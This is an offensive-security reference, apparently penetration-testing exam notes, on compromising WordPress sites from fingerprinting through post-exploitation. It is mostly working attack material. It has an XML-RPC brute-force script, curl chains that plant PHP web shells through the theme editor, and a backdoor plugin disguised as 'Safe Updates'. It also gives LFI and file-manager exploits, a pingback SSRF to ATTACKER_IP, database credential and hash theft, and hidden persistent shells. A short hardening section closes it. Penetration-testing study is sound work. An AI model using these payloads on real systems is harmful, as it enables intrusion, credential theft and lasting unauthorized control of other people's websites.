---
title: "Attacking WordPress"
description: "Complete reference for discovering, enumerating, and exploiting WordPress installations — from fingerprinting through remote code execution."
date: 2026-07-15
tags:
  - WordPress
  - Web Attacks
  - CMS
  - Enumeration
  - Exploitation
---

# Attacking WordPress

WordPress powers over 40% of the internet. Its massive plugin ecosystem, frequent misconfigurations, and predictable file structure make it one of the most common targets during penetration tests and certification exams. This guide covers the full attack lifecycle: discovery, enumeration, exploitation, and post-exploitation.

---

## 1. Discovery & Fingerprinting

Before attacking WordPress, confirm it's running and identify its version. Multiple passive and active techniques exist.

### 1.1 robots.txt Analysis

Browse to `/robots.txt` — WordPress installations almost always expose one:

```shell
curl -s http://blog.inlanefreight.local/robots.txt
```

Typical output:

```text
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://blog.inlanefreight.local/wp-sitemap.xml
```

!!! info "Why this matters"
    The presence of `/wp-admin/`, `/wp-content/`, or a WordPress sitemap URL immediately confirms the CMS. The `Disallow` entries also hint at installed plugins (e.g., `wpforms` above).

### 1.2 Default WordPress File Paths

Test for these well-known paths to confirm WordPress:

| Path | Purpose |
|------|---------|
| `/wp-admin/` | Admin dashboard login redirect |
| `/wp-login.php` | Login page |
| `/wp-content/` | Themes, plugins, uploads |
| `/wp-includes/` | Core libraries and scripts |
| `/xmlrpc.php` | XML-RPC API endpoint |
| `/wp-cron.php` | Scheduled task handler |
| `/wp-json/` | REST API root |
| `/readme.html` | WordPress version info |
| `/license.txt` | GPL license (confirms WP) |

```shell
# Quick check for common WP paths
for path in wp-login.php wp-admin/ wp-content/ wp-includes/ xmlrpc.php readme.html; do
  echo -n "$path: "; curl -s -o /dev/null -w "%{http_code}" http://blog.inlanefreight.local/$path; echo
done
```

### 1.3 Version Detection

Multiple sources leak the WordPress core version:

**Meta Generator Tag** (most common):

```shell
curl -s http://blog.inlanefreight.local/ | grep -i "generator"
```

```html
<meta name="generator" content="WordPress 6.4.2" />
```

**RSS Feed:**

```shell
curl -s http://blog.inlanefreight.local/feed/ | grep -i "generator"
```

```xml
<generator>https://wordpress.org/?v=6.4.2</generator>
```

**readme.html** (often left after install):

```shell
curl -s http://blog.inlanefreight.local/readme.html | grep -i "version"
```

**wp-links-opml.php:**

```shell
curl -s http://blog.inlanefreight.local/wp-links-opml.php | grep -i "generator"
```

**CSS/JS version parameters:**

```shell
curl -s http://blog.inlanefreight.local/ | grep -oP "ver=\K[0-9.]+"  | sort -u
```

!!! tip "Version Removed?"
    Security-conscious admins remove the generator tag. Fall back to CSS/JS `?ver=` params, `readme.html`, or RSS feeds. Plugin/theme version strings in source code also reveal the WP generation.

### 1.4 Technology Fingerprinting

**WhatWeb:**

```shell
whatweb http://blog.inlanefreight.local
```

```text
http://blog.inlanefreight.local [200 OK] Apache[2.4.41], Country[RESERVED][ZZ],
HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], JQuery[3.6.0],
MetaGenerator[WordPress 6.4.2], PoweredBy[WordPress], Script, Title[Blog – Inlanefreight],
UncommonHeaders[link], WordPress[6.4.2]
```

**curl headers inspection:**

```shell
curl -I http://blog.inlanefreight.local/
```

Look for:

- `X-Powered-By: PHP/x.x` (PHP version)
- `Link: <http://blog.inlanefreight.local/wp-json/>; rel="https://api.w.org/"` (REST API)
- `X-Pingback: http://blog.inlanefreight.local/xmlrpc.php` (XML-RPC)

### 1.5 HTTP Response Headers That Leak WordPress Info

| Header | Indicates |
|--------|-----------|
| `X-Pingback` | XML-RPC is enabled |
| `Link: ...wp-json...` | REST API is active |
| `X-Powered-By` | PHP version |
| `X-Redirect-By: WordPress` | WordPress redirect handler |
| `Set-Cookie: wordpress_*` | WP session cookies |

### 1.6 Identifying Themes and Plugins from Page Source

```shell
# Extract theme name
curl -s http://blog.inlanefreight.local/ | grep -oP "themes/\K[^/]+" | sort -u
```

```shell
# Extract plugin names from page source
curl -s http://blog.inlanefreight.local/ | grep -oP "plugins/\K[^/]+" | sort -u
```

```shell
# Full approach — grab all wp-content references
curl -s http://blog.inlanefreight.local/ | grep -oP "/wp-content/(themes|plugins)/[^/]+" | sort -u
```

---

## 2. WordPress User Roles & Permissions

Understanding roles helps prioritize targets. Not every account is worth brute-forcing.

| Role | Dashboard Access | Can Publish | Can Edit Others' Posts | Can Install Plugins/Themes | Can Edit PHP Files | Attack Value |
|------|:---:|:---:|:---:|:---:|:---:|:---:|
| **Administrator** | ✅ | ✅ | ✅ | ✅ | ✅ | **Critical** — leads to RCE |
| **Editor** | ✅ | ✅ | ✅ | ❌ | ❌ | High — can abuse vulnerable plugins |
| **Author** | ✅ | ✅ (own) | ❌ | ❌ | ❌ | Medium — upload capabilities |
| **Contributor** | ✅ | ❌ (draft only) | ❌ | ❌ | ❌ | Low — limited dashboard |
| **Subscriber** | Limited | ❌ | ❌ | ❌ | ❌ | Minimal — profile only |

!!! warning "Key Takeaway"
    Always prioritize Administrator accounts. Editor and Author accounts can still be valuable if vulnerable plugins are installed that require only those privilege levels.


---

## 3. Enumeration

### 3.1 Manual User Enumeration

#### Author Archives (Numeric Brute-Force)

WordPress redirects `/?author=N` to the author's archive page, leaking the username in the URL slug:

```shell
# Enumerate first 20 user IDs
for i in $(seq 1 20); do
  echo -n "ID $i: "
  curl -s -o /dev/null -w "%{redirect_url}\n" "http://blog.inlanefreight.local/?author=$i"
done
```

A valid user returns: `http://blog.inlanefreight.local/author/admin/`

#### REST API User Endpoint

```shell
curl -s http://blog.inlanefreight.local/wp-json/wp/v2/users | jq '.[].slug'
```

```json
"admin"
"editor_james"
"author_sarah"
```

!!! tip "API Disabled?"
    If the REST API returns 401, try: `/wp-json/wp/v2/users?per_page=100&page=1` or the legacy `/?rest_route=/wp/v2/users`.

#### Login Error Message Differentiation

Navigate to `/wp-login.php` and test usernames:

- **Valid username, wrong password:** `"The password you entered for the username admin is incorrect."`
- **Invalid username:** `"Unknown username. Check again or try your email address."`

```shell
# Confirm a username exists via login form
curl -s -d "log=admin&pwd=wrong&wp-submit=Log+In" \
  http://blog.inlanefreight.local/wp-login.php | grep -i "incorrect\|unknown"
```

#### XML-RPC wp.getUsersBlogs

```shell
curl -s -X POST http://blog.inlanefreight.local/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password123</string></value></param>
  </params>
</methodCall>'
```

A response containing `<name>isAdmin</name>` confirms valid credentials. An "Incorrect username or password" fault means the username is valid but the password is wrong (vs. a different fault for non-existent users, depending on WP version).

#### RSS Feed Author Extraction

```shell
curl -s http://blog.inlanefreight.local/feed/ | grep -oP "<dc:creator><!\[CDATA\[\K[^\]]+"
```

### 3.2 Manual Plugin & Theme Enumeration

#### Plugin Enumeration

```shell
# From page source
curl -s http://blog.inlanefreight.local/ | grep -oP "plugins/\K[^/]+" | sort -u

# Direct path probing (check for readme.txt which leaks version)
curl -s http://blog.inlanefreight.local/wp-content/plugins/akismet/readme.txt | head -5

# Check if directory listing is enabled
curl -s http://blog.inlanefreight.local/wp-content/plugins/
```

#### Theme Enumeration

```shell
# Active theme from page source
curl -s http://blog.inlanefreight.local/ | grep -oP "themes/\K[^/]+" | sort -u

# Theme readme/style.css for version
curl -s http://blog.inlanefreight.local/wp-content/themes/flavor/style.css | head -20
```

#### Directory Listing on Uploads

```shell
curl -s http://blog.inlanefreight.local/wp-content/uploads/ | grep -i "index of"
```

!!! info "Uploads Directory"
    If directory listing is enabled on `/wp-content/uploads/`, you can browse uploaded files organized by year/month. This may reveal sensitive documents, backup files, or configuration exports.

### 3.3 Automated Enumeration with WPScan

WPScan is the go-to WordPress scanner. It fingerprints core, themes, plugins, and users, and cross-references the WPVulnDB for known vulnerabilities.

#### Basic Syntax

```shell
wpscan --url http://blog.inlanefreight.local/ --enumerate vp,vt,u
```

#### Important Flags

| Flag | Purpose |
|------|---------|
| `--url` | Target URL |
| `--enumerate` | What to enumerate (see below) |
| `--api-token` | WPVulnDB API key (required for vuln data) |
| `--plugins-detection` | `passive`, `aggressive`, or `mixed` |
| `--passwords` | Password list for brute-force |
| `--usernames` | Username list or single user |
| `--threads` | Number of threads |
| `--force` | Don't check if target is WordPress |
| `--stealthy` | Reduces noise (random UA, passive detection) |
| `--disable-tls-checks` | Skip SSL verification |

#### Enumerate Options (`-e`)

| Value | Enumerates |
|-------|-----------|
| `vp` | Vulnerable plugins |
| `ap` | All plugins |
| `p` | Popular plugins |
| `vt` | Vulnerable themes |
| `at` | All themes |
| `t` | Popular themes |
| `u` | Users (IDs 1-10) |
| `u1-50` | Users (IDs 1-50) |
| `tt` | Timthumbs |
| `cb` | Config backups |
| `dbe` | DB exports |
| `m` | Media IDs |

#### Full Aggressive Scan Example

```shell
wpscan --url http://blog.inlanefreight.local/ \
  --enumerate ap,at,u1-50,cb,dbe \
  --plugins-detection aggressive \
  --api-token YOUR_WPSCAN_API_TOKEN \
  --threads 10
```

#### Interpreting WPScan Output

Key sections to watch for:

```text
[+] WordPress version 6.4.2 identified (Insecure, released on 2024-01-30).
[!] 3 vulnerabilities identified:
    [!] Title: WordPress < 6.4.3 - ...

[i] Plugin(s) Identified:
[+] contact-form-7
 | Location: http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/
 | Last Updated: 2024-02-15
 | [!] The version is out of date, the latest version is 5.9

[+] Enumerating Users (via Author ID Brute Forcing)
 Identified the following 3 user(s):
    +----+-------+-------+
    | Id | Login | Name  |
    +----+-------+-------+
    | 1  | admin | Admin |
    | 2  | james | James |
    +----+-------+-------+
```

!!! tip "WPScan API Token"
    Without an API token, WPScan won't show vulnerability details. Get a free token at [wpscan.com](https://wpscan.com) — the free tier allows 25 API requests/day.

---

## 4. Login Attacks

### 4.1 Default Credentials

Always try these first before brute-forcing:

| Username | Password |
|----------|----------|
| `admin` | `admin` |
| `admin` | `password` |
| `admin` | `password123` |
| `admin` | `wordpress` |
| `admin` | `admin123` |
| `administrator` | `administrator` |
| `root` | `root` |
| `admin` | (site name / domain) |

### 4.2 WPScan Password Brute-Force

```shell
wpscan --url http://blog.inlanefreight.local/ \
  --passwords /usr/share/wordlists/rockyou.txt \
  --usernames admin,editor_james \
  --threads 20 \
  --max-threads 20
```

WPScan handles CSRF tokens automatically and is the recommended tool for WordPress brute-forcing.

### 4.3 XML-RPC Brute-Force (Bypasses Rate Limiting)

XML-RPC's `wp.getUsersBlogs` method accepts credentials and doesn't have rate limiting by default. The `system.multicall` method lets you test **hundreds of passwords in a single HTTP request**.

#### Single Credential Test

```shell
curl -s -X POST http://blog.inlanefreight.local/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password123</string></value></param>
  </params>
</methodCall>'
```

**Success** returns blog details. **Failure** returns a `<fault>` with "Incorrect username or password."

#### Multicall Brute-Force (Multiple Passwords Per Request)

```shell
curl -s -X POST http://blog.inlanefreight.local/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password1</string></value>
      </data></array></value></member>
    </struct></value>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password2</string></value>
      </data></array></value></member>
    </struct></value>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password3</string></value>
      </data></array></value></member>
    </struct></value>
  </data></array></value></param></params>
</methodCall>'
```

!!! danger "Why This Is Powerful"
    A single HTTP request can test 500+ passwords. Most WAFs and rate-limiters count requests, not credentials-per-request. This bypasses plugins like Wordfence's login rate limiting.

### 4.4 Hydra Against wp-login.php

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  blog.inlanefreight.local http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered"
```

!!! warning "CSRF Tokens"
    Modern WordPress includes CSRF tokens on login. Hydra doesn't handle dynamic tokens natively. For reliable brute-forcing, prefer WPScan or the XML-RPC method.

### 4.5 Custom Python XML-RPC Brute-Force Script

```python
#!/usr/bin/env python3
"""WordPress XML-RPC brute-force via system.multicall"""
import requests
import sys

TARGET = "http://blog.inlanefreight.local/xmlrpc.php"
USERNAME = "admin"
BATCH_SIZE = 500  # passwords per request

def build_multicall(username, passwords):
    methods = ""
    for pwd in passwords:
        methods += f"""<value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>{username}</string></value>
        <value><string>{pwd}</string></value>
      </data></array></value></member>
    </struct></value>"""
    return f"""<?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName>
<params><param><value><array><data>{methods}</data></array></value></param></params>
</methodCall>"""

def main():
    wordlist = sys.argv[1] if len(sys.argv) > 1 else "/usr/share/wordlists/rockyou.txt"
    with open(wordlist, "r", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Testing {len(passwords)} passwords against '{USERNAME}'")
    for i in range(0, len(passwords), BATCH_SIZE):
        batch = passwords[i:i+BATCH_SIZE]
        xml = build_multicall(USERNAME, batch)
        r = requests.post(TARGET, data=xml, headers={"Content-Type": "text/xml"})
        # Each response in multicall is either a fault or success
        if "isAdmin" in r.text or "blogid" in r.text:
            # Find which password worked
            for pwd in batch:
                single = build_multicall(USERNAME, [pwd])
                r2 = requests.post(TARGET, data=single, headers={"Content-Type": "text/xml"})
                if "isAdmin" in r2.text:
                    print(f"[+] FOUND: {USERNAME}:{pwd}")
                    return
        print(f"[*] Tested {min(i+BATCH_SIZE, len(passwords))}/{len(passwords)}...")
    print("[-] Password not found.")

if __name__ == "__main__":
    main()
```


---

## 5. Exploitation Techniques

### 5.1 Authenticated RCE — Theme Editor

With Administrator access, the Theme Editor (`Appearance → Theme Editor`) allows direct PHP file editing. Inject code into a rarely-visited template like `404.php`.

#### Step-by-Step

1. Log in to `/wp-admin/`
2. Navigate to `Appearance → Theme Editor`
3. Select the active theme's `404.php` (or any template)
4. Insert a PHP web shell at the top:

```php
<?php system($_GET['cmd']); ?>
```

5. Click "Update File"
6. Trigger execution:

```shell
curl "http://blog.inlanefreight.local/wp-content/themes/flavor/404.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Automated via curl (No Browser Needed)

```shell
# Step 1: Authenticate and grab cookies + nonce
COOKIES=$(mktemp)
curl -s -c $COOKIES -b $COOKIES \
  -d "log=admin&pwd=admin123&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F" \
  http://blog.inlanefreight.local/wp-login.php

# Step 2: Get the theme editor nonce
NONCE=$(curl -s -b $COOKIES http://blog.inlanefreight.local/wp-admin/theme-editor.php?file=404.php \
  | grep -oP '_wpnonce=\K[a-f0-9]+' | head -1)

# Step 3: Inject payload into 404.php
curl -s -b $COOKIES \
  -d "_wpnonce=$NONCE&newcontent=<?php+system(\$_GET['cmd']);+?>&action=update&file=404.php&theme=flavor" \
  http://blog.inlanefreight.local/wp-admin/theme-editor.php

# Step 4: Execute
curl "http://blog.inlanefreight.local/wp-content/themes/flavor/404.php?cmd=whoami"
```

### 5.2 Authenticated RCE — Plugin Editor

Same concept, different path. `Plugins → Plugin Editor` lets you edit any installed plugin's PHP:

1. Navigate to `Plugins → Plugin Editor`
2. Select a plugin (e.g., Akismet, Hello Dolly)
3. Inject PHP into the main plugin file
4. Trigger: `http://blog.inlanefreight.local/wp-content/plugins/akismet/akismet.php?cmd=id`

!!! tip "Hello Dolly"
    The "Hello Dolly" plugin ships with WordPress by default and is almost never used. It's a perfect injection target — no one will notice changes to `hello.php`.

### 5.3 Malicious Plugin Upload

Upload a plugin containing a web shell. This is the cleanest method since it doesn't modify existing files.

#### Create a Minimal Backdoor Plugin

```php
<?php
/**
 * Plugin Name: Safe Updates
 * Description: System maintenance utilities
 * Version: 1.0
 * Author: Developer
 */
system($_GET['cmd']);
?>
```

Save as `safe-updates.php`, then package:

```shell
zip safe-updates.zip safe-updates.php
```

#### Upload via Admin Panel

1. `Plugins → Add New → Upload Plugin`
2. Upload `safe-updates.zip`
3. Activate the plugin
4. Execute:

```shell
curl "http://blog.inlanefreight.local/wp-content/plugins/safe-updates/safe-updates.php?cmd=id"
```

#### Upload via WPScan (if creds known)

```shell
# WPScan doesn't directly upload plugins, but Metasploit does (see below)
```

### 5.4 Metasploit — wp_admin_shell_upload

```shell
msfconsole -q
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS blog.inlanefreight.local
set TARGETURI /
set USERNAME admin
set PASSWORD admin123
set LHOST tun0
run
```

This module:

1. Authenticates to wp-admin
2. Uploads a PHP Meterpreter payload as a plugin
3. Activates and triggers it
4. Gives you a Meterpreter session

!!! info "Exam Note"
    On the OSCP exam, Metasploit usage is restricted (one module per attempt). For CPTS, it's fair game. Know both manual and automated approaches.

### 5.5 XML-RPC Attacks

#### What Is XML-RPC?

`xmlrpc.php` is a legacy API that allows remote interaction with WordPress (publishing posts, managing comments, authentication). It's enabled by default on most installations and provides a rich attack surface.

#### Confirm XML-RPC Is Active

```shell
curl -s -X POST http://blog.inlanefreight.local/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
```

This returns all available methods — look for `wp.getUsersBlogs`, `system.multicall`, `pingback.ping`.

#### Enumerate Available Methods

```shell
curl -s -X POST http://blog.inlanefreight.local/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>' | xmllint --format - | grep methodName
```

#### Pingback SSRF

The `pingback.ping` method can be abused for Server-Side Request Forgery — making the WordPress server send HTTP requests to arbitrary internal services:

```shell
curl -s -X POST http://blog.inlanefreight.local/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://ATTACKER_IP:8080/ssrf-test</string></value></param>
    <param><value><string>http://blog.inlanefreight.local/?p=1</string></value></param>
  </params>
</methodCall>'
```

Use this to:

- Port-scan internal hosts
- Access internal services (metadata endpoints, admin panels)
- Exfiltrate data via error-based responses

#### Pingback DDoS Amplification

The pingback mechanism can also be weaponized for DDoS — multiple WordPress sites can be tricked into sending pingback requests to a victim. Each WordPress server adds its own request weight.

!!! danger "Legal Warning"
    DDoS attacks are illegal. This is documented for awareness and defensive purposes only. In exam contexts, use SSRF for internal recon, not DDoS.

### 5.6 REST API Exploitation

#### Information Disclosure

```shell
# List all published posts (may contain sensitive info)
curl -s http://blog.inlanefreight.local/wp-json/wp/v2/posts | jq '.[].title.rendered'

# List pages
curl -s http://blog.inlanefreight.local/wp-json/wp/v2/pages | jq '.[].slug'

# Get site settings
curl -s http://blog.inlanefreight.local/wp-json/

# List media attachments
curl -s http://blog.inlanefreight.local/wp-json/wp/v2/media | jq '.[].source_url'
```

#### Content Injection (CVE-2017-1001000 Style)

In vulnerable versions (WP < 4.7.2), the REST API allowed unauthenticated content modification by appending a numeric suffix to the endpoint:

```shell
# Modify post ID 1 without authentication (WP < 4.7.2)
curl -X POST "http://blog.inlanefreight.local/wp-json/wp/v2/posts/1?id=1abc" \
  -d '{"title":"Hacked","content":"<script>alert(1)</script>"}'
```

!!! info "Modern WordPress"
    This specific CVE is patched in any maintained WP install. However, poorly-coded plugins often expose custom REST endpoints with broken authentication.

### 5.7 Known Vulnerable Plugins

These plugins have well-documented exploits. Check for them during enumeration:

| Plugin | Vulnerability | Type | CVE/Reference |
|--------|--------------|------|---------------|
| **Mail Masta** | LFI via `inc/campaign/count_of_send.php` | Local File Inclusion | EDB-40290 |
| **WP Symposium** ≤14.11 | Unauthenticated RCE | Remote Code Execution | CVE-2014-10021 |
| **Slideshow Gallery** ≤1.4.6 | Authenticated SQLi | SQL Injection | EDB-34681 |
| **Social Warfare** ≤3.5.2 | Unauthenticated RCE (RFI) | Remote Code Execution | CVE-2019-9978 |
| **Easy WP SMTP** | Settings exposure → account takeover | Information Disclosure | — |
| **WP File Manager** ≤6.8 | Unauthenticated RCE | Remote Code Execution | CVE-2020-25213 |
| **InfiniteWP Client** | Auth bypass | Authentication Bypass | CVE-2020-8772 |
| **WP GDPR Compliance** | Privilege escalation | Privilege Escalation | CVE-2018-19207 |
| **Duplicator** ≤1.3.26 | Unauthenticated arbitrary file download | File Disclosure | CVE-2020-11738 |
| **ThemeGrill Demo Importer** | DB wipe + admin reset | Critical | CVE-2020-5509 |

#### Exploiting Mail Masta (LFI)

```shell
curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

#### Exploiting WP File Manager (CVE-2020-25213)

```shell
# Upload a web shell via the connector endpoint
curl -F "cmd=upload" \
  -F "target=l1_Lw" \
  -F "upload[]=@shell.php" \
  "http://blog.inlanefreight.local/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"

# Execute
curl "http://blog.inlanefreight.local/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id"
```

#### Using searchsploit

```shell
# Search for WordPress plugin exploits
searchsploit wordpress file manager
searchsploit wordpress mail masta
searchsploit wordpress social warfare

# Mirror an exploit to current directory
searchsploit -m php/webapps/49178.py

# Update the database
searchsploit -u
```

#### Metasploit WordPress Modules

```shell
msfconsole -q
search wordpress type:exploit

# Commonly used modules:
use exploit/unix/webapp/wp_admin_shell_upload
use exploit/unix/webapp/wp_symposium_shell_upload
use exploit/unix/webapp/wp_slideshowgallery_upload
use exploit/unix/webapp/wp_crop_rce
use auxiliary/scanner/http/wordpress_login_enum
use auxiliary/scanner/http/wordpress_xmlrpc_login
```

---

## 6. Post-Exploitation

Once you have a shell or admin access, extract maximum value.

### 6.1 Reading wp-config.php

The holy grail — contains database credentials, auth keys, and sometimes debug info:

```shell
cat /var/www/html/wp-config.php
```

Key information to extract:

```php
define('DB_NAME', 'wordpress_db');
define('DB_USER', 'wp_user');
define('DB_PASSWORD', 'SuperSecretP@ss!');
define('DB_HOST', 'localhost');

// Auth keys — useful for forging cookies
define('AUTH_KEY', '...');
define('SECURE_AUTH_KEY', '...');
define('LOGGED_IN_KEY', '...');

// Debug mode — may expose errors
define('WP_DEBUG', true);
define('WP_DEBUG_LOG', true);  // Check /wp-content/debug.log
```

!!! danger "Credential Reuse"
    Database credentials from `wp-config.php` are frequently reused for SSH, MySQL on other hosts, or admin panels. Always test them elsewhere.

### 6.2 Dumping the WordPress Database

```shell
# Connect to MySQL with extracted credentials
mysql -u wp_user -p'SuperSecretP@ss!' -h localhost wordpress_db

# Or one-liner dump
mysqldump -u wp_user -p'SuperSecretP@ss!' wordpress_db > /tmp/wp_dump.sql
```

### 6.3 Extracting Password Hashes

```shell
mysql -u wp_user -p'SuperSecretP@ss!' wordpress_db -e "SELECT user_login, user_pass FROM wp_users;"
```

```text
+-------------+------------------------------------+
| user_login  | user_pass                          |
+-------------+------------------------------------+
| admin       | $P$B7jG2BAX3Ry.Lqo.99YRn5cQ3YXe1  |
| editor_james| $P$BkB.51rHGYNP2fQApRLi5C9m5fBk0l1 |
| author_sarah| $P$BUjmN0WbLFMFdKkbvjqCgm18uc5Xev0 |
+-------------+------------------------------------+
```

### 6.4 Cracking WordPress Hashes

WordPress uses **phpass** (`$P$` prefix) — a portable PHP password hashing framework based on MD5 with iterations.

```shell
# Hashcat (mode 400 for phpass)
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt --force

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

!!! info "Hash Format"
    WordPress hashes start with `$P$B` (or `$P$` for older). The character after `$P$` indicates the iteration count (logarithmic). Mode 400 in Hashcat handles all phpass variants.

### 6.5 Lateral Movement

- **Database credentials** → Try on SSH, FTP, other MySQL instances
- **WordPress auth keys** → Forge admin cookies without a password
- **Email accounts** → Check WP user emails in `wp_users` table, try credential reuse
- **wp-config.php secrets** → Try as passwords for system accounts
- **Connected services** → Check for SMTP credentials, API keys in plugin settings

```shell
# Check for other config files with credentials
find /var/www/ -name "*.conf" -o -name "*.cfg" -o -name "*.ini" | xargs grep -l "password\|passwd\|pwd"

# Check for SSH keys
find /home/ -name "id_rsa" -o -name "authorized_keys" 2>/dev/null

# Check debug log for sensitive info
cat /var/www/html/wp-content/debug.log 2>/dev/null | grep -i "password\|secret\|key"
```


### 6.6 Uploading a Persistent Web Shell

If you need persistence beyond the current session:

```shell
# Upload a minimal PHP shell to an inconspicuous location
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /var/www/html/wp-includes/class-wp-update.php

# Or hide in uploads (less likely to be overwritten during updates)
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/wp-content/uploads/.cache.php
```

```shell
# Verify access
curl "http://blog.inlanefreight.local/wp-includes/class-wp-update.php?c=whoami"
curl "http://blog.inlanefreight.local/wp-content/uploads/.cache.php?cmd=id"
```

!!! tip "Persistence Considerations"
    - Files in `wp-includes/` survive plugin/theme updates but not core updates
    - Files in `wp-content/uploads/` survive all updates
    - Use dot-prefixed filenames (`.cache.php`) for stealth
    - Avoid `wp-admin/` — it gets overwritten during core updates

---

## 7. Defense & Hardening

Understanding defenses helps you identify what's NOT in place during an assessment.

### Core Hardening Measures

| Defense | Implementation | Bypass Difficulty |
|---------|---------------|:-:|
| Keep WP/plugins/themes updated | Auto-updates or managed hosting | High |
| Disable XML-RPC | `add_filter('xmlrpc_enabled', '__return_false');` or `.htaccess` block | N/A if done |
| Disable file editing | `define('DISALLOW_FILE_EDIT', true);` in wp-config.php | Prevents theme/plugin editor RCE |
| Two-Factor Authentication | Plugin (WP 2FA, Google Authenticator) | Blocks brute-force value |
| Limit login attempts | Wordfence, Limit Login Attempts Reloaded | XML-RPC bypass still works |
| WAF / Cloudflare | Cloudflare, Sucuri, Wordfence WAF | Varies by rule set |
| Least privilege roles | Only give admin to who needs it | Reduces blast radius |
| Security headers | CSP, X-Frame-Options, HSTS | Prevents some XSS/clickjacking |
| Database prefix change | Non-default `$table_prefix` in wp-config.php | Complicates SQLi |
| Hide WordPress version | Remove generator tag, readme.html | Obscurity only |

### .htaccess Hardening Example

```apache
# Block xmlrpc.php
<Files xmlrpc.php>
  Order Deny,Allow
  Deny from all
</Files>

# Protect wp-config.php
<Files wp-config.php>
  Order Allow,Deny
  Deny from all
</Files>

# Disable directory browsing
Options -Indexes

# Block PHP execution in uploads
<Directory "/var/www/html/wp-content/uploads/">
  <FilesMatch "\.php$">
    Order Allow,Deny
    Deny from all
  </FilesMatch>
</Directory>
```

---

## 8. Tools Reference Table

| Tool | Purpose | Example Command |
|------|---------|-----------------|
| **WPScan** | WordPress-specific scanner (enum + vulns) | `wpscan --url http://TARGET/ -e ap,at,u --api-token TOKEN` |
| **cURL** | Manual HTTP requests, header inspection | `curl -s http://TARGET/wp-json/wp/v2/users` |
| **Hydra** | Login brute-force (limited WP support) | `hydra -l admin -P rockyou.txt TARGET http-post-form "/wp-login.php:..."` |
| **Metasploit** | Exploit modules + shell upload | `use exploit/unix/webapp/wp_admin_shell_upload` |
| **searchsploit** | Offline exploit database search | `searchsploit wordpress plugin_name` |
| **WhatWeb** | Technology fingerprinting | `whatweb http://TARGET/` |
| **Burp Suite** | Intercept/modify requests, test manually | Manual proxy-based testing |
| **xmlrpc-bruteforcer** | Dedicated XML-RPC password attacks | `python3 xmlrpc-bruteforcer.py -u admin -w rockyou.txt -t TARGET` |
| **Nmap** | Service/version detection + http-enum | `nmap -sV --script http-wordpress-enum TARGET` |
| **John/Hashcat** | Crack phpass hashes | `hashcat -m 400 hashes.txt rockyou.txt` |


---

## 9. Cheatsheet

### Discovery Commands

```shell
# Confirm WordPress
curl -s http://SERVER_IP/ | grep -i "wordpress\|wp-content\|wp-includes"
curl -s http://SERVER_IP/robots.txt
curl -s http://SERVER_IP/readme.html
curl -I http://SERVER_IP/ | grep -i "x-pingback\|link.*wp-json"

# Version detection
curl -s http://SERVER_IP/ | grep -oP 'content="WordPress \K[0-9.]+'
curl -s http://SERVER_IP/feed/ | grep -oP '\?v=\K[0-9.]+'
curl -s http://SERVER_IP/ | grep -oP "ver=\K[0-9.]+" | sort -u

# Technology stack
whatweb http://SERVER_IP/
curl -I http://SERVER_IP/
```

### Enumeration Commands

```shell
# Users — manual
for i in $(seq 1 20); do curl -s -o /dev/null -w "ID $i: %{redirect_url}\n" "http://SERVER_IP/?author=$i"; done
curl -s http://SERVER_IP/wp-json/wp/v2/users | jq '.[].slug'
curl -s http://SERVER_IP/feed/ | grep -oP "<dc:creator><!\[CDATA\[\K[^\]]+"

# Plugins & themes — manual
curl -s http://SERVER_IP/ | grep -oP "plugins/\K[^/]+" | sort -u
curl -s http://SERVER_IP/ | grep -oP "themes/\K[^/]+" | sort -u

# WPScan — full enumeration
wpscan --url http://SERVER_IP/ -e ap,at,u1-50,cb,dbe --plugins-detection aggressive --api-token TOKEN

# WPScan — user-only (quick)
wpscan --url http://SERVER_IP/ -e u

